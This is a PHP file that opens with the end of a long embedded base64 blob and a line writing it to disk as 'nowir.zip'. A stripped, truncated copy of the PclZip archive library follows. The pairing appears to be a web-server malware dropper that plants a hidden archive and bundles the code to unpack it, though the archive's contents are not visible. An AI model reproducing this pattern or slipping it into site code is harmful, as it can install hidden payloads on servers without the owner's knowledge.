EAGAC1Ur31btLTAbVSvfVu0tMBiQmnx0jO0wFQSwUGAAAAABAAEAAoBgAAdV4AAAAA"); 
file_put_contents("nowir.zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
